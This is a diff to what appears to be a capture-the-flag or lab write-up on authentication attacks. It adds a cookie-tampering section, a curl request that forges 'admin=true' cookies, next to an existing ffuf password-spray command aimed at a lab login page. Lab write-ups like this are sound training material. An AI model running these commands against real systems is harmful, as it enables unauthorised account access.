@@ -25,3 +25,11 @@ Once we know the username we can try out password spray attacks.
 ffuf -w username.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.32.200/customers/login -fc 200 
 ```
 {% endcode %}
+
+### Cookie Tampering
+
+{% code overflow="wrap" %}
+```bash
+curl -H "Cookie: logged_in=true; admin=true" http://10.10.32.200/cookie-test
+```
+{% endcode %}
